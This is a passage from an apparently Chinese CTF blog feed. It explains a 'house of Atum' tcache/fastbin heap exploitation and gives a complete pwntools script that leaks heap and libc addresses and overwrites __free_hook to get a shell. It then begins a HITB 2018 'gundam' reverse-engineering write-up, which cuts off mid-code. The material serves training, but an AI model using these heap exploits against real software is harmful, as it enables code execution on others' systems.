delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">    <span class="comment">#2</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">    heap_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&quot;heap_addr:0x%x&quot;</span> % heap_addr)</span><br></pre></td></tr></table></figure><p>先申请一个chunk，再申请第二个，在第二个chunk的最后0x08的位置放入0x11，防止top chunk合并。<br>把第一个chunk free六次，装满tcache，然后show，即可泄露chunk地址。<br>看一下代码段中#1 #2位置时的内存：</p><h4 id="1"><a href="#1" class="headerlink" title="#1"></a>#1</h4><p><img src="https://img-blog.csdnimg.cn/2021032616070891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到紧贴topchunk的那个chunk并没有被合并</p><h4 id="2"><a href="#2" class="headerlink" title="#2"></a>#2</h4><p><img src="https://img-blog.csdnimg.cn/20210326160743953.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210326160801739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210326160934739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>可以看到此时的chunk0的next指针位已经被写入了chunk地址，它的地址正好是chunk0的用户区域起始地址。利用show()即可输出该地址。</p><h3 id="2-泄露libc基地址"><a href="#2-泄露libc基地址" class="headerlink" title="2.泄露libc基地址"></a>2.泄露libc基地址</h3><p>这段脚本信息量很大，分段说明</p><h4 id="第一段"><a href="#第一段" class="headerlink" title="第一段"></a>第一段</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>) <span class="comment">#! -&gt;fastbin</span></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">   new(p64(heap_addr - <span class="number">0x20</span>))</span><br><span class="line">   <span class="comment">#2</span></span><br><span class="line">   new(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">   <span class="comment">#3</span></span><br><span class="line">   delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">   new(p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line"><span class="comment">#4</span></span><br></pre></td></tr></table></figure><p>在上一步，tcache已被塞满，因此再delete一次，就会使chunk0被装入fastbin。<br>fastbin是单链表，它依靠在chunk的用户区域前0x08位置写入fd指针，来进行单链表的添加，删除操作。<br>chunk0是第一个进入fastbin的，它的前面没有任何chunk，因此它的fd指针为空，所以用户区域的前0x08变成了0。<br>但是在此之前，chunk0还在tcache的时候，它在用户区域前0x08的位置装的是tcache所用的next指针。因此它在被装入fastbin的同时，相当于清空了它的next指针位。</p><h4 id="1-1"><a href="#1-1" class="headerlink" title="#1"></a>#1</h4><p><img src="https://img-blog.csdnimg.cn/20210326162232735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时的tcache和fastbin<br><img src="https://img-blog.csdnimg.cn/20210326162247758.png" alt="在这里插入图片描述"><br>下一步，申请一个chunk并写入heap_addr - 0x20的地址。<br>首先，申请会发生什么。因为tcache和fastbin中都有chunk，会优先从tcache中取出一个chunk。但是，由于上一行代码已经将chunk0的next指针清空，因此取出chunk的同时就清空了tcache的entries指针，此时的tcache有6个chunk记录（counts = 6）但是却没有指向任何chunk的指针（entries = 0）。</p><h4 id="2-1"><a href="#2-1" class="headerlink" title="#2"></a>#2</h4><p><img src="https://img-blog.csdnimg.cn/20210326162711287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下一步，申请一个chunk。<br>由于tcache中的entries已经被清空，所以只会从fastbin中取chunk。由于tcache的管理机制，如果从fastbin中申请了一个chunk，就会自动的将fastbin中其他chunk放入tcache中。<br>有一个小细节，因为fastbin的fd指针指向的是chunk头，而tcache的next指针指向的是chunk的用户区域，他们之间有0x10的偏移，因此当fastbin中的chunk放入tcache时，会把chunk指针的地址+0x10。<br>回到这次操作，申请这个chunk后，chunk0从fastbin中取出。虽然实际上fastbin中并没有两个chunk，但是在上一步，chunk0的fd指针被改了，管理器以为还有chunk，把+0x10被放入了tcache的entries。</p><h4 id="3"><a href="#3" class="headerlink" title="#3"></a>#3</h4><p><img src="https://img-blog.csdnimg.cn/20210326190713282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到，fastbin和tcache的地址相同。但是意义不一样，tcache指向的是用户区域，而fastbin指向的是chunk头。此时只要将tcache中的chunk取出，就能够控制chunk0的chunk头。</p><p>最后两行<br>将之前new(‘A’)的chunk释放，因为tcache已满，所以它会被放入fastbin。<br>再申请一个新chunk（chunk1），因为tcache优先度比fastbin更高，所以会从tcache中取出之前构造好的地址的堆块。同时，覆盖原有的size改成0x91，使chunk大小超过fastbin范围，帮助之后泄露libc基地址。</p><h4 id="4"><a href="#4" class="headerlink" title="#4"></a>#4</h4><p><img src="https://img-blog.csdnimg.cn/20210326192003705.png" alt="在这里插入图片描述"><br>可以看到chunk的size已经变成0x91了，证明chunk1已经控制了size域（内鬼造好了）。</p><h4 id="第二段"><a href="#第二段" class="headerlink" title="第二段"></a>第二段</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&quot;A&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3dac78</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:0x%x&quot;</span> % libc_base)</span><br></pre></td></tr></table></figure><p>之后的步骤就简单了，将0x91的chunk free8次装入unsorted bin。此时chunk0的fd和bk已经被修改，只要通过chunk1用‘A’把chunk0的chunk头填满，再show chunk1，就能泄露出fd指针，通过指针再本地调试即可算出libc基地址。</p><h4 id="1-2"><a href="#1-2" class="headerlink" title="#1"></a>#1</h4><p><img src="https://img-blog.csdnimg.cn/20210326192902415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>chunk已经被放入unsorted bin</p><h4 id="2-2"><a href="#2-2" class="headerlink" title="#2"></a>#2</h4><p><img src="https://img-blog.csdnimg.cn/20210326192937176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用chunk1装满chunk0的chunk头，可以看到4141已经和fd指针相连，用show即可完成泄露。<br><img src="https://img-blog.csdnimg.cn/20210326193122211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把泄露的地址和libc基地址相减计算出偏移地址，完成libc基地址计算。</p><h3 id="3-改写-free-hook"><a href="#3-改写-free-hook" class="headerlink" title="3.改写__free_hook"></a>3.改写__free_hook</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc_base + <span class="number">0xfcc6e</span></span><br><span class="line">   free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">   edit(<span class="number">1</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p64(free_hook-<span class="number">0x10</span>))</span><br><span class="line">   new(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">   delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">   new(p64(one_gadget))</span><br><span class="line">   io.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   io.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">   io.interactive()</span><br></pre></td></tr></table></figure><p>用onegadget指令获取地址。通过chunk1修改chunk0的fd指针，用一样的操作，申请chunk，修改tcache的entries指针，再把它free掉，放入fastbin，再从tcache申请chunk，即可在__free_hook上创建堆块，将地址修改为one_gadget，再随便free一个chunk，完成。</p><h2 id="0x03-脚本"><a href="#0x03-脚本" class="headerlink" title="0x03 脚本"></a>0x03 脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> commonFunc <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bi0x/ctf/tools/glibc-all-in-one/libs/2.26-0ubuntu2_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">cont</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;content:&quot;</span>,cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&quot;content:&quot;</span>,cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx,x</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;(y/n)&quot;</span>,x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line">    <span class="keyword">global</span> heap_addr</span><br><span class="line">    new(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    new(p64(<span class="number">0</span>)*<span class="number">7</span> + p64(<span class="number">0x11</span>))</span><br><span class="line">    delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">    heap_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&quot;heap_addr:0x%x&quot;</span> % heap_addr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>():</span></span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>) </span><br><span class="line">    new(p64(heap_addr - <span class="number">0x20</span>))</span><br><span class="line">    new(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    new(p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    debug(io)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&quot;A&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line">    debug(io)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3dac78</span></span><br><span class="line">    log.info(<span class="string">&quot;libc_base:0x%x&quot;</span> % libc_base)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    one_gadget = libc_base + <span class="number">0xfcc6e</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p64(free_hook-<span class="number">0x10</span>))</span><br><span class="line">    new(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    new(p64(one_gadget))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    leak()</span><br><span class="line">    leak_libc()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;堆利用-TCache机制-hauseofAtum&quot;&gt;&lt;a href=&quot;#堆利用-TCache机制-hauseofAtum&quot; class=&quot;headerlink&quot; title=&quot;[堆利用:TCache机制]hauseofAtum&quot;&gt;&lt;/a&gt;[堆利用:TCache机制</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://blog.k0nashi.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://blog.k0nashi.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>HITB CTF 2018:gundam</title>
    <link href="http://blog.k0nashi.cn/2021/03/19/gundam/"/>
    <id>http://blog.k0nashi.cn/2021/03/19/gundam/</id>
    <published>2021-03-19T10:17:18.000Z</published>
    <updated>2023-04-03T06:57:33.349Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆利用-TCache机制-HITB-CTF-2018-gundam"><a href="#堆利用-TCache机制-HITB-CTF-2018-gundam" class="headerlink" title="[堆利用:TCache机制]HITB CTF 2018:gundam"></a>[堆利用:TCache机制]HITB CTF 2018:gundam</h1><p>题目链接：<a href="https://github.com/moonAgirl/CTF/tree/master/2018/Hitbxctf/gundam">https://github.com/moonAgirl/CTF/tree/master/2018/Hitbxctf/gundam</a></p><h2 id="0x00-逆向分析"><a href="#0x00-逆向分析" class="headerlink" title="0x00 逆向分析"></a>0x00 逆向分析</h2><h3 id="sub-AEA"><a href="#sub-AEA" class="headerlink" title="sub_AEA"></a>sub_AEA</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_AEA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1 . Build a gundam &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2 . Visit gundams &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3 . Destory a gundam&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4 . Blow up the factory&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5 . Exit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your choice : &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看一下菜单，字面意思很好理解<br>1.构造一个高达 2.遍历输出每个高达 3.删除一个高达 4.炸掉工厂 5.退出<br>然后按顺序看看每个功能对应的函数</p><h3 id="sub-B7D-构造高达"><a href="#sub-B7D-构造高达" class="headerlink" title="sub_B7D 构造高达"></a>sub_B7D 构造高达</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B7D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  s = <span class="number">0LL</span>;</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_20208C &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !buf )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error !&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The name of gundam :&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    *((_QWORD *)s + <span class="number">1</span>) = buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The type of the gundam :&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)s + <span class="number">16</span>, &amp;aFreedom[<span class="number">20</span> * v1]);</span><br><span class="line">    *(_DWORD *)s = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !factory[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        factory[i] = s;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++dword_20208C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>几行关键性的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">malloc</span>(<span class="number">0x28</span>)</span><br><span class="line">buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">*((_QWORD *)s + <span class="number">1</span>) = buf;</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="keyword">char</span> *)s + <span class="number">16</span>, &amp;aFreedom[<span class="number">20</span> * v1]);</span><br><span class="line">*(_DWORD *)s = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !factory[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        factory[i] = s;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以分析出高达的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gundam</span>&#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span> flag;</span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"><span class="keyword">char</span> type[<span class="number">24</span>];</span><br><span class="line">&#125;gundam;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gundam</span> *<span class="title">factory</span>[9]</span></span><br></pre></td></tr></table></figure><p>每个高达都包含了两个chunk，一个0x30大小的factory，一个0x100大小的name。<br>factory主要装了一个flag，用于表示工厂内是否有高达（之后删除高达会用到），<br>一个name chunk的指针，一个高达类型，根据用户选择对应一个字符串。<br>特别关注一下read函数，buf的大小是0x100而读取大小也是0x100，并且没有对最后一位字符进行\x00处理，因此存在信息泄露。<br>name内部只有字符串，很简单的构造。</p><h3 id="sub-EF4-遍历输出高达信息"><a href="#sub-EF4-遍历输出高达信息" class="headerlink" title="sub_EF4 遍历输出高达信息"></a>sub_EF4 遍历输出高达信息</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_EF4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] 